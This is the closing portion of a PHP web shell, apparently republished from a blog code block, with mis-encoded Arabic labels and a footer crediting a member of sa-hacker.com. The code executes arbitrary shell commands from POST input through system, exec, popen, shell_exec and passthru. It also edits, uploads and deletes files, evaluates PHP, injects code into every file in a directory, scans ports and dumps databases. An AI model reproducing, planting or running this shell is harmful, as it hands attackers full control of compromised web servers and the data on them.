echo "&lt;/table&gt;";
   if(isset($_POST['cmdex']))
   {
   switch ($_POST['functionz']) {
    case "system":
    system(stripslashes($_POST['cmd']));
    break;
    case "popen":
    $handle = popen($_POST['cmd'].' 2&gt;&1', 'r');
    echo "'$handle'; " . gettype($handle) . "n";
    $read = fread($handle, 2096);
    echo $read;
    pclose($handle);
    break;
    case "shell_exec":
    shell_exec(stripslashes($_POST['cmd']));
    break;
    case "exec":
    exec(stripslashes($_POST['cmd']));
    break;
    case "passthru":
    passthru(stripslashes($_POST['cmd']));
    }}

if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)
{
$file = $_POST['editfile'];
$content = file_get_contents($file);
echo "&lt;br&gt;&lt;table class='menu' width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;form action='' method='post'&gt;&lt;center&gt;
&lt;font size=2 face='Verdana'&gt;&lt;b&gt;ÊÍÑíÑ ÇáãáÝ&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;input type='hidden' name='editfile' value='".$file."'&gt;&lt;font size=1 face='Verdana'&gt;&lt;font color=#FF0000&gt;ãÓÇÑ ÇáãáÝ ==&gt;&lt;/font&gt; ".stripslashes($file)."&lt;/font&gt;&lt;br&gt;
&lt;textarea rows=20 cols=80 name='newtext'&gt;".htmlspecialchars($content)."&lt;/textarea&gt;&lt;br /&gt;&lt;input type='submit' name='edit' value='äÝÐ'&gt;&lt;/form&gt;&lt;/td&gt;&lt;/table&gt;";
}
if(isset($_POST['edit'])) {
$file = $_POST['editfile'];
$fh = fopen($file, "w+")or die("&lt;div align=center&gt;
	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
&lt;font color=#FF0000&gt;áÇ íãßä ÝÊÍ ÇáãáÝ&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
");
fwrite($fh, stripslashes($_POST['newtext']))or die("&lt;div align=center&gt;
	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
&lt;center&gt;áã íÊã ÊÍÑíÑ ÇáãáÝ&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;");
fclose($fh);
echo "&lt;div align=center&gt;
	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
&lt;center&gt;Êã ÊÍÑíÑ ÇáãáÝ ÈäÌÇÍ Úáì ÇáãÓÇÑ ÇáÊÇáí&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;div align=center&gt;
&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
&lt;center&gt;&lt;/font&gt; ".stripslashes($file)."&lt;/font&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;

";
}
echo "&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
&lt;center&gt;&lt;font size='2' dir=rtl face='tahoma'&gt;:: ÃÌãÇáí ÇáãáÝÇÊ: $fileq  ($filew ãáÝ æ  $pahtw ãÌáÏ)  ::&lt;/font&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;center&gt;&lt;table class=menuz width=100% cellspacing=0 cellpadding=0 border=0&gt;
&lt;font size='1'&gt;
&lt;td valign=top&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÃÓã ÇáãáÝ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÇáäæÚ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font face='tahoma' size=2&gt;&lt;b&gt;ÇáÍÌã :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top width=10%&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÇáÊÕÑíÍ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;$listf&lt;/font&gt;
&lt;/table&gt;&lt;/center&gt;";

echo "
&lt;table class='menu' dir='ltr' cellspacing='0' cellpadding='0' border='0' width='100%'&gt;&lt;tr&gt;&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅÏÑÇÌ ßæÏ Èí ÇÊÔ Èí ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;textarea name=php_eval cols=50 rows=4&gt;&lt;/textarea&gt;&lt;br&gt;
   &lt;input type='submit' value='äÝÐ'&gt;
   &lt;/form&gt;
&lt;/td&gt;&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Tahoma' size='2'&gt;&lt;b&gt;:: ÍÞä ßæÏ Ýí ÌãíÚ ãáÝÇÊ ãÓÇÑß ÇáÍÇáí ::&lt;/b&gt;&lt;/font&gt;&lt;form method='post' action=''&gt;&lt;textarea name='cod3inf' cols=50 rows=4&gt;<?php /* ÖÚ ÇáßæÏ åäÇ */ ?>&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='äÝÐ' name='inf3ct'&gt;&lt;br&gt;";
if(isset($textzz)) { echo $textzz; }
echo "&lt;/center&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;
&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÇáÐåÇÈ Çáì ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
&lt;form name='directory' method='post' action=''&gt;
&lt;input type='text' name='dir' value='$dir' size=53&gt;
&lt;input type='submit' value='äÝÐ'&gt;
&lt;/form&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÊÍÑíÑ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
&lt;form method='post' action=''&gt;
&lt;input type='text' name='editfile'  value='$dir' size=50 &gt;
&lt;input type='submit' value='äÝÐ' name='doedit'&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size=2 face='Tahoma'&gt;:: ÊØÈíÞ ÇáÃæÇãÑ ::&lt;/font&gt;&lt;/b&gt;&lt;br&gt;
        &lt;form method='post' action=''&gt;
      &lt;input name=cmd size=35  type=text&gt;
        &lt;select name=functionz&gt;
          &lt;option&gt;passthru&lt;/option&gt;
          &lt;option&gt;popen&lt;/option&gt;
          &lt;option&gt;exec&lt;/option&gt;
          &lt;option&gt;shell_exec&lt;/option&gt;
          &lt;option&gt;system&lt;/option&gt;
        &lt;/select&gt; &lt;input  type='submit'  name='cmdex'  value='äÝÐ'&gt;&lt;/form&gt;&lt;/td&gt;
      &lt;td&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÝÍÕ ãäÇÝÐ ÇáÓíÑÝÑ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form name='scanner' method='post'&gt;
   &lt;input type='text' name='host' size=40 value='".$_SERVER['SERVER_ADDR']."' &gt;
   &lt;select name='protocol'&gt;
   &lt;option value='tcp'&gt;tcp&lt;/option&gt;
   &lt;option value='udp'&gt;udp&lt;/option&gt;
   &lt;/select&gt;
   &lt;input type='submit' value='äÝÐ'&gt;
";
if(isset($host) && isset($proto))
{
echo "&lt;br /&gt;&lt;font size='1' face='Tahoma'&gt;ÇáãäÇÝÐ ÇáãÝÊæÍå: ";

for($current = 0; $current &lt;= 23; $current++)
{
$currents = $myports[$current];
$service = getservbyport($currents, $proto);
// ÇáÈæÑÊÇÊ ÇáÝÊæÍå
$result = fsockopen($host, $currents, $errno, $errstr, 1);
// ÚÑÖ results
if($result)
{
echo "$currents, ";
}
}
}
echo "&lt;/font&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;
&lt;td valign=top width=50%&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2'  face='Tahoma'&gt;:: ÑÝÚ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action='' enctype='multipart/form-data'&gt;
   &lt;input type='hidden' name='dare' value='$dir'&gt;
   &lt;input type='file' name='ffile' size=40&gt;
   &lt;input type='submit' name='ok' value='äÝÐ'&gt;
   &lt;/center&gt;   
   &lt;/form&gt;
&lt;/td&gt;
&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÍÐÝ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;input type='text' size=50 name='delete' value='$dir' &gt; &lt;input type='submit' value='äÝÐ' name='deletfilez'&gt;
   &lt;/center&gt;
   &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;
&lt;td valign=top&gt;

&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅäÔÇÁ ãÌáÏ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;input type='text' name='makedir' value='$dir' size=52&gt; &lt;input type='submit' value='äÝÐ'&gt;
   &lt;/center&gt;
   &lt;/form&gt;
&lt;/td&gt;
&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÍÐÝ ãÌáÏ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;input type='text' name='deletedir' size=50 value='$dir'&gt; &lt;input type='submit' value='äÝÐ'&gt;
   &lt;/center&gt;
   &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;
&lt;td valign=top width=50%&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅäÔÇÁ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;input type='hidden' name='darezz' value='$dir'&gt;
   &lt;font size='1' face='Tahoma'&gt;ÅÓã ÇáãáÝ :&lt;/font&gt;&lt;br&gt;
   &lt;input type='text' name='names' size='30'&gt;&lt;br&gt;
   &lt;font size='1' face='Tahoma'&gt;ãÍÊæì ÇáãáÝ :&lt;/font&gt;&lt;br&gt;
   &lt;textarea rows='16' cols='30' name='source'&gt;&lt;/textarea&gt;&lt;br&gt;
   &lt;input type='submit' value='äÝÐ'&gt;
   &lt;/center&gt;
   &lt;/form&gt;
&lt;/td&gt;
&lt;td valign=top width=50%&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÇáÅÊÕÇá ÈÇáÞÇÚÏå ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;font size='1' face='Tahoma'&gt;ÇáãÓÊÎÏã   --   ÇáÈÇÓæÑÏ&lt;/font&gt;&lt;br&gt;
   &lt;input type='text' name='user' size='10'&gt;
   &lt;input type='text' name='passd' size='10'&gt;&lt;br&gt;
   &lt;font size='1' face='Tahoma'&gt;ÇáãÓÊÖíÝ:&lt;/font&gt;&lt;br&gt;
   &lt;input type='text' name='host' value='localhost'&gt;&lt;br&gt;
   &lt;font size='1' face='Tahoma'&gt;ÅÓã ÇáÞÇÚÏå:&lt;/font&gt;&lt;br&gt;
   &lt;input type='text' name='db'&gt;&lt;br&gt;
   &lt;font size='1' face='Tahoma'&gt;ÅÓÊÚáÇã:&lt;/font&gt;&lt;br&gt;
   &lt;textarea rows='10' cols='30' name='query'&gt;&lt;/textarea&gt;&lt;br&gt;
   &lt;input type='submit' value='ÅÑÓÇá ÅÓÊÚáÇã' name='godb'&gt;&lt;br&gt;&lt;input type='submit' name='dump' value='ÊÝÑíÛ ÇáÞÇÚÏå'&gt;
   &lt;/center&gt;
   &lt;/form&gt;
&lt;/td&gt; &lt;/tr&gt;

&lt;/table&gt;
&lt;/table&gt;

&lt;table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'&gt;
&lt;tr&gt;
&lt;td valign=top&gt;
&lt;center&gt;&lt;font size='1' face='Verdana'&gt;
&lt;b&gt;&lt;font color=#FF0000&gt;::&lt;/font&gt; Powered by 
&lt;a href=http://www.sa-hacker.com/vb/member.php?u=3624&gt;H4KOOOM&lt;/a&gt; - Hk@8.Nf -( &lt;a href=http://www.sa-hacker.com&gt;Sa-Hacker.com )&lt;/a&gt; - Vers10n ".$version." 
&lt;font color=#FF0000&gt;::&lt;/font&gt; &lt;/b&gt;
&lt;/center&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/body&gt;
&lt;/html&gt;";

?>
{% endhighlight %}